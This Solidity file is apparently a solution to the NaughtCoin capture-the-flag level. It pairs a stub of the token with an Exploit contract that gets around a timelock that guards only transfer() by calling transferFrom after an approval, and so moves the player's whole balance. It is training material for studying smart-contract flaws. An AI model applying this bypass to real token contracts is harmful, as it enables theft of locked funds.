// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "exploit_templates/Destructible.sol";
import "exploit_templates/Targeted.sol";

contract NaughtCoin {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  function approve(address spender, uint256 amount) public returns (bool) {
    return true;
  }

  function transfer(address _to, uint256 _value) public lockTokens returns(bool) {
    return true;
  }
  function transferFrom(address from, address to, uint256 amount) public returns (bool) {
    return true;
  }
  function balanceOf(address account) public view returns (uint256) {
    return 0;
  }
  function allowance(address owner, address spender) public view returns (uint256) {
    return 0;
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  }
}

contract Exploit is Destructible, Targeted {
  constructor(address target_addr) payable Targeted(target_addr) {
  }
  function exploit() public payable {
    NaughtCoin coin = NaughtCoin(Targeted(this).target());

    // the script already called approve() so we have permission to take all the tokens
    coin.transferFrom(msg.sender, address(this), coin.balanceOf(msg.sender));
  }
  receive() external payable {
  }
}